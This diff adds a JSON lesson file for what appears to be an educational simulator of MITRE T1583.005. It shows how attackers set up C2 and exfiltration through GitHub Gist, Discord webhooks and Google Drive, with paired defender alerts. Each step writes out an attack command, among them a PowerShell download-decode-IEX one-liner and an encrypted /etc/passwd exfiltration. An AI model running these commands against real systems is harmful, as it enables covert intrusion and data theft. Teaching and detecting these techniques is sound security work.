@@ -1,0 +1,180 @@
+{
+  "id": "T1583.005",
+  "title": "웹 서비스 인프라 확보 시뮬레이션",
+  "titleEn": "Web Services Infrastructure Acquisition Simulation",
+  "duration": 10,
+  "phases": [
+    { "label": "🔍 서비스 선정", "labelEn": "🔍 Service Selection", "steps": [0, 1] },
+    { "label": "⚡ C2 구축", "labelEn": "⚡ C2 Setup", "steps": [2, 3] },
+    { "label": "✅ 운영 테스트", "labelEn": "✅ Operational Test", "steps": [4] }
+  ],
+  "topoNodes": [
+    { "id": "ext", "label": "Attacker", "x": 50, "y": 60 },
+    { "id": "github", "label": "GitHub Gist", "x": 200, "y": 30 },
+    { "id": "gdrive", "label": "Google Drive", "x": 200, "y": 90 },
+    { "id": "victim", "label": "Victim PC", "x": 350, "y": 60 },
+    { "id": "exfil", "label": "Exfil Data", "x": 500, "y": 60 }
+  ],
+  "topoEdges": [
+    { "from": "ext", "to": "github", "minStep": 0 },
+    { "from": "ext", "to": "gdrive", "minStep": 2 },
+    { "from": "victim", "to": "github", "minStep": 3 },
+    { "from": "victim", "to": "exfil", "minStep": 4 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "{companyName} Data", "icon": "📁" },
+    { "name": "c2_config.json", "icon": "📄", "alert": true },
+    { "name": "payload.ps1", "icon": "📝" }
+  ],
+  "steps": [
+    {
+      "cmd": "curl -s -X POST https://api.github.com/gists -H 'Authorization: token ghp_STOLEN_TOKEN' -d '{\"files\":{\"config.txt\":{\"content\":\"aWQ7dXB0aW1lO3dob2FtaQ==\"}}}'",
+      "out": "{\n  \"id\": \"a1b2c3d4e5f6\",\n  \"url\": \"https://api.github.com/gists/a1b2c3d4e5f6\",\n  \"html_url\": \"https://gist.github.com/a1b2c3d4e5f6\",\n  \"files\": {\n    \"config.txt\": {\n      \"filename\": \"config.txt\",\n      \"size\": 24,\n      \"raw_url\": \"https://gist.githubusercontent.com/.../config.txt\"\n    }\n  },\n  \"public\": false,\n  \"created_at\": \"2026-03-01T09:15:00Z\"\n}",
+      "def": "[GitHub Security] New Gist created with Base64-encoded content from unusual IP",
+      "defAction": "Source: API token ghp_STOLEN_TOKEN\nTarget: GitHub Gist API\nAction: Content flagged for review, token activity monitored",
+      "desc": "GitHub Gist에 Base64 인코딩된 C2 명령을 업로드하여 Dead Drop 기반 C2 채널을 구축합니다.",
+      "descEn": "Uploading Base64-encoded C2 commands to GitHub Gist to establish a Dead Drop-based C2 channel.",
+      "stepTitle": "GitHub Gist C2 채널 생성",
+      "stepTitleEn": "GitHub Gist C2 Channel Creation",
+      "feynman": "비밀 쪽지를 '공원 벤치 아래'에 숨기는 것과 비슷합니다. 공격자는 GitHub Gist에 암호화된 명령을 올려두고, 감염된 컴퓨터가 주기적으로 이 Gist를 확인하여 명령을 받습니다. github.com은 거의 모든 회사에서 허용하는 사이트이므로 방화벽을 쉽게 통과합니다.",
+      "feynmanEn": "Like hiding a secret note under a park bench. The attacker uploads encrypted commands to GitHub Gist, and infected computers periodically check this Gist for new commands. github.com is allowed by almost all corporate firewalls, making it easy to bypass.",
+      "expert": "Private Gist는 URL을 알아야만 접근 가능하므로 C2 Dead Drop으로 적합합니다. Base64 인코딩된 페이로드(id;uptime;whoami)는 기본적인 시스템 정보 수집 명령입니다.",
+      "expertEn": "Private Gists are only accessible with the URL, making them suitable as C2 Dead Drops. The Base64-encoded payload (id;uptime;whoami) contains basic system information gathering commands.",
+      "defTooltip": "🔗 GitHub 보안: 비정상 IP에서 Base64 콘텐츠를 포함한 Gist 생성 감지",
+      "defTooltipEn": "🔗 GitHub Security: Gist with Base64 content created from unusual IP detected",
+      "hackerLog": {
+        "title": "gist_c2.log",
+        "lines": [
+          { "log": "Gist ID: a1b2c3d4e5f6", "desc": "💡 C2 Dead Drop 생성 완료 — 이 URL로 명령을 주고받습니다" },
+          { "log": "Content: aWQ7dXB0aW1lO3dob2FtaQ==", "desc": "💡 Base64 디코딩: id;uptime;whoami — 시스템 정보 수집 명령" },
+          { "log": "public: false", "desc": "💡 Private Gist — URL을 모르면 발견할 수 없습니다" }
+        ]
+      },
+      "terms": [
+        { "name": "Dead Drop", "desc": "공격자와 멀웨어가 직접 통신하지 않고 중간 매체(웹 서비스)를 통해 명령을 주고받는 방식. 추적이 어렵습니다" },
+        { "name": "GitHub Gist", "desc": "GitHub의 코드 스니펫 공유 서비스. Private Gist는 URL을 알아야만 접근 가능하여 C2 채널로 악용됩니다" }
+      ]
+    },
+    {
+      "cmd": "python3 -c \"import discord; bot=discord.Client(); webhook=discord.Webhook.from_url('https://discord.com/api/webhooks/123/abc', adapter=discord.RequestsWebhookAdapter()); webhook.send('C2 channel ready')\"",
+      "out": "Webhook sent successfully\nChannel: #botnet-control (private)\nMessage: 'C2 channel ready'\nTimestamp: 2026-03-01T09:20:00Z",
+      "def": "[Network Monitor] Discord Webhook API call from corporate network endpoint",
+      "defAction": "Source: 10.0.1.45 (compromised host)\nTarget: discord.com/api/webhooks\nAction: Outbound webhook traffic flagged for review",
+      "desc": "Discord Webhook을 통해 실시간 C2 통신 채널과 데이터 유출 경로를 설정합니다.",
+      "descEn": "Setting up real-time C2 communication channel and data exfiltration path via Discord Webhook.",
+      "stepTitle": "Discord Webhook C2 설정",
+      "stepTitleEn": "Discord Webhook C2 Setup",
+      "feynman": "Discord 서버에 '비밀 채팅방'을 만들고, 감염된 컴퓨터가 이 채팅방에 자동으로 메시지를 보내게 합니다. 탈취한 파일, 시스템 정보, 스크린샷 등을 Discord 메시지로 전송합니다. discord.com은 많은 회사에서 허용하는 사이트입니다.",
+      "feynmanEn": "Creating a 'secret chat room' on Discord, and having infected computers automatically send messages to it. Stolen files, system info, screenshots are all sent as Discord messages. discord.com is allowed by many corporate networks.",
+      "expert": "Discord Webhook은 인증 없이 POST 요청만으로 메시지를 전송할 수 있어 C2 구축이 간단합니다. 파일 업로드도 지원하므로 데이터 유출에도 활용됩니다. HTTPS 트래픽이므로 내용 검사가 어렵습니다.",
+      "expertEn": "Discord Webhooks require only a POST request without authentication, making C2 setup simple. File uploads are supported, enabling data exfiltration. HTTPS traffic makes content inspection difficult.",
+      "defTooltip": "📡 네트워크 모니터: 기업 네트워크에서 Discord Webhook API 호출 감지",
+      "defTooltipEn": "📡 Network Monitor: Discord Webhook API call from corporate network detected",
+      "hackerLog": {
+        "title": "discord_c2.log",
+        "lines": [
+          { "log": "Webhook: discord.com/api/webhooks/123/abc", "desc": "💡 C2 통신 채널 생성 — 실시간 명령 전달 가능" },
+          { "log": "Channel: #botnet-control (private)", "desc": "💡 비공개 채널이므로 외부에서 발견 불가" },
+          { "log": "C2 channel ready", "desc": "💡 이중 C2 채널 구성 완료 — GitHub Gist + Discord" }
+        ]
+      },
+      "terms": [
+        { "name": "Webhook", "desc": "특정 이벤트 발생 시 URL로 HTTP 요청을 보내는 메커니즘. Discord Webhook은 인증 없이 메시지를 전송할 수 있어 C2에 악용됩니다" },
+        { "name": "Discord Bot API", "desc": "Discord의 프로그래밍 인터페이스. 봇을 통해 채팅방에 메시지 전송, 파일 업로드 등이 가능합니다" }
+      ]
+    },
+    {
+      "cmd": "python3 -c \"from googleapiclient.discovery import build; drive=build('drive','v3',credentials=creds); drive.files().create(body={'name':'report.docx','mimeType':'application/vnd.google-apps.document'},media_body='payload.exe').execute()\"",
+      "out": "File uploaded successfully:\n  ID: 1aBcDeFgHiJkLmNoPqRs\n  Name: report.docx\n  Size: 245,760 bytes\n  MIME: application/vnd.google-apps.document\n  Share Link: https://drive.google.com/file/d/1aBc.../view\n  Shared: Anyone with the link",
+      "def": "[DLP] Suspicious file upload to Google Drive — executable disguised as document",
+      "defAction": "Source: Attacker's Google account\nTarget: Google Drive\nAction: File flagged by Google Safe Browsing (delayed)",
+      "desc": "Google Drive에 악성 페이로드를 문서 파일로 위장하여 업로드하고 공유 링크를 생성합니다.",
+      "descEn": "Uploading malicious payload disguised as a document to Google Drive and creating a share link.",
+      "stepTitle": "Google Drive 페이로드 호스팅",
+      "stepTitleEn": "Google Drive Payload Hosting",
+      "feynman": "악성코드를 '보고서' 파일로 위장하여 Google Drive에 올립니다. 피해자에게 '이 문서를 확인해주세요'라는 이메일과 함께 Google Drive 링크를 보내면, drive.google.com은 신뢰할 수 있는 사이트이므로 의심 없이 클릭합니다.",
+      "feynmanEn": "Disguising malware as a 'report' file and uploading it to Google Drive. Sending the victim an email saying 'Please review this document' with a Google Drive link — drive.google.com is a trusted site, so victims click without suspicion.",
+      "expert": "Google Drive의 공유 링크를 통한 페이로드 배포는 drive.google.com의 도메인 신뢰도를 악용합니다. Safe Browsing의 악성코드 탐지가 있지만, 초기 업로드 후 탐지까지 시간 지연이 있어 그 사이에 배포가 완료됩니다.",
+      "expertEn": "Payload distribution via Google Drive share links exploits drive.google.com's domain reputation. Safe Browsing malware detection exists but has a delay between upload and detection, allowing distribution to complete.",
+      "defTooltip": "🔒 DLP: Google Drive에 실행파일이 문서로 위장 업로드됨",
+      "defTooltipEn": "🔒 DLP: Executable disguised as document uploaded to Google Drive",
+      "hackerLog": {
+        "title": "gdrive_payload.log",
+        "lines": [
+          { "log": "Name: report.docx (actually payload.exe)", "desc": "💡 악성코드를 문서로 위장 — 확장자 속임수" },
+          { "log": "Share: Anyone with the link", "desc": "💡 링크만 있으면 누구나 다운로드 가능 — 피싱에 활용" },
+          { "log": "Domain: drive.google.com", "desc": "💡 Google 도메인이므로 방화벽/프록시 통과 보장" }
+        ]
+      },
+      "terms": [
+        { "name": "Living off Trusted Sites (LoTS)", "desc": "신뢰할 수 있는 웹 서비스(Google, GitHub 등)를 공격 인프라로 악용하는 전략. 도메인 신뢰도를 이용하여 보안 솔루션을 우회합니다" },
+        { "name": "DLP (Data Loss Prevention)", "desc": "데이터 유출 방지 솔루션. 민감한 데이터의 외부 전송을 탐지하고 차단합니다" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"$c=(Invoke-RestMethod -Uri 'https://gist.githubusercontent.com/.../config.txt'); $d=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($c)); IEX $d\"",
+      "out": "[+] Fetching C2 command from GitHub Gist...\n[+] Decoded command: id;uptime;whoami\n[+] Executing...\n\nuid=1000(user) gid=1000(user)\n up 47 days, 3:24\n user@WORKSTATION-PC\n\n[+] Sending results to Discord webhook...\n[+] Response uploaded successfully",
+      "def": "[EDR] PowerShell executing Base64-decoded content from GitHub API",
+      "defAction": "Source: WORKSTATION-PC (10.0.1.45)\nTarget: gist.githubusercontent.com\nAction: AMSI alert triggered, process behavior logged",
+      "desc": "감염된 호스트에서 GitHub Gist의 C2 명령을 가져와 실행하고 결과를 Discord로 전송합니다.",
+      "descEn": "The infected host fetches C2 commands from GitHub Gist, executes them, and sends results via Discord.",
+      "stepTitle": "C2 명령 실행 테스트",
+      "stepTitleEn": "C2 Command Execution Test",
+      "feynman": "감염된 컴퓨터가 GitHub에서 '비밀 쪽지'를 가져와 읽고, 지시대로 행동한 후 결과를 Discord에 보고합니다. 모든 통신이 github.com과 discord.com을 통해 이루어지므로 방화벽에서 차단하기 매우 어렵습니다.",
+      "feynmanEn": "The infected computer fetches the 'secret note' from GitHub, reads it, acts on the instructions, and reports results to Discord. All communication goes through github.com and discord.com, making firewall blocking very difficult.",
+      "expert": "PowerShell의 Invoke-RestMethod로 Gist 콘텐츠를 가져와 Base64 디코딩 후 IEX(Invoke-Expression)로 실행합니다. AMSI가 탐지할 수 있지만, 난독화나 AMSI 바이패스 기법으로 우회 가능합니다.",
+      "expertEn": "PowerShell's Invoke-RestMethod fetches Gist content, Base64 decodes it, and executes via IEX (Invoke-Expression). AMSI may detect this, but obfuscation or AMSI bypass techniques can evade it.",
+      "defTooltip": "🛡️ EDR: PowerShell이 GitHub API에서 Base64 콘텐츠를 가져와 실행 중",
+      "defTooltipEn": "🛡️ EDR: PowerShell executing Base64-decoded content from GitHub API",
+      "hackerLog": {
+        "title": "c2_test.log",
+        "lines": [
+          { "log": "Fetching from gist.githubusercontent.com", "desc": "💡 C2 명령을 GitHub에서 수신 — 정상 트래픽으로 위장" },
+          { "log": "user@WORKSTATION-PC", "desc": "💡 시스템 정보 수집 성공 — 다음 단계 명령 준비" },
+          { "log": "Results → Discord webhook", "desc": "💡 결과를 Discord로 유출 — 이중 채널 C2 동작 확인" }
+        ]
+      },
+      "terms": [
+        { "name": "IEX (Invoke-Expression)", "desc": "PowerShell에서 문자열을 코드로 실행하는 명령. 다운로드한 스크립트를 바로 실행할 때 사용되며 공격에 자주 악용됩니다" },
+        { "name": "AMSI (Anti-Malware Scan Interface)", "desc": "Windows의 악성코드 검사 인터페이스. PowerShell 스크립트를 실행 전에 검사하지만 우회 기법이 존재합니다" }
+      ]
+    },
+    {
+      "cmd": "python3 exfil_test.py --method gdrive --data /etc/passwd --webhook discord --encrypt AES256",
+      "out": "[+] Reading target file: /etc/passwd (2,456 bytes)\n[+] Encrypting with AES-256-CBC...\n[+] Splitting into 1 chunks (< 8MB limit)\n[+] Uploading chunk 1/1 to Google Drive...\n  File ID: 2xYzAbCdEfGh\n  Share link: https://drive.google.com/file/d/2xYz.../view\n[+] Notifying via Discord webhook...\n  Message: 'Exfil complete: passwd (AES256)'\n\n=== OPERATIONAL STATUS ===\nGitHub Gist C2: ACTIVE\nDiscord Webhook: ACTIVE\nGoogle Drive Exfil: ACTIVE\nTotal channels: 3 (redundant)",
+      "def": "[SIEM] Multi-channel C2 infrastructure using legitimate web services detected",
+      "defAction": "Source: Correlation engine\nTarget: GitHub, Discord, Google Drive\nAction: Incident created — legitimate service abuse campaign identified",
+      "desc": "Google Drive로 데이터를 유출하고 Discord로 알림을 보내 다중 채널 C2 인프라의 작동을 확인합니다.",
+      "descEn": "Exfiltrating data via Google Drive and notifying via Discord to confirm multi-channel C2 infrastructure operation.",
+      "stepTitle": "다중 채널 운영 테스트",
+      "stepTitleEn": "Multi-Channel Operations Test",
+      "feynman": "3개의 합법적 서비스(GitHub, Discord, Google Drive)를 조합한 완전한 공격 인프라가 완성되었습니다. GitHub에서 명령을 받고, Discord로 상태를 보고하고, Google Drive로 데이터를 유출합니다. 모든 트래픽이 신뢰할 수 있는 HTTPS 사이트를 통해 이루어집니다.",
+      "feynmanEn": "A complete attack infrastructure combining 3 legitimate services (GitHub, Discord, Google Drive) is ready. Commands from GitHub, status reports via Discord, data exfiltration through Google Drive. All traffic flows through trusted HTTPS sites.",
+      "expert": "AES-256으로 암호화된 데이터를 Google Drive에 업로드하면 DLP 솔루션의 콘텐츠 검사를 우회합니다. 3개 채널의 이중화(redundancy)로 하나가 차단되어도 나머지로 작전을 지속할 수 있습니다.",
+      "expertEn": "AES-256 encrypted data uploaded to Google Drive bypasses DLP content inspection. Redundancy across 3 channels ensures operations continue even if one is blocked.",
+      "defTooltip": "🗺️ SIEM: 합법적 웹 서비스를 악용한 다중 채널 C2 인프라 감지",
+      "defTooltipEn": "🗺️ SIEM: Multi-channel C2 infrastructure using legitimate web services detected",
+      "hackerLog": {
+        "title": "infra_status.log",
+        "lines": [
+          { "log": "GitHub Gist C2: ACTIVE", "desc": "💡 명령 채널 정상 동작 — github.com 도메인으로 방화벽 우회" },
+          { "log": "Google Drive Exfil: ACTIVE", "desc": "💡 데이터 유출 채널 확인 — AES 암호화로 DLP 우회" },
+          { "log": "Total channels: 3 (redundant)", "desc": "💡 3중 이중화 인프라 — 하나가 차단되어도 나머지로 지속 가능" }
+        ]
+      },
+      "terms": [
+        { "name": "C2 Redundancy", "desc": "여러 개의 C2 채널을 동시에 운영하여 하나가 차단되어도 다른 채널로 작전을 지속할 수 있게 하는 전략" },
+        { "name": "Data Exfiltration", "desc": "탈취한 데이터를 외부로 전송하는 행위. 합법적 클라우드 서비스를 통해 이루어지면 탐지가 극히 어렵습니다" }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "bash", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "curl → GitHub API (PID: 5101)", "depth": 1, "alert": false, "minStep": 0 },
+    { "name": "python3 → Discord (PID: 5134)", "depth": 1, "alert": false, "minStep": 1 },
+    { "name": "python3 → Google Drive (PID: 5201)", "depth": 1, "alert": false, "minStep": 2 },
+    { "name": "powershell → IEX (PID: 5289)", "depth": 1, "alert": true, "minStep": 3 },
+    { "name": "python3 exfil_test.py (PID: 5345)", "depth": 1, "alert": true, "minStep": 4 }
+  ]
+}
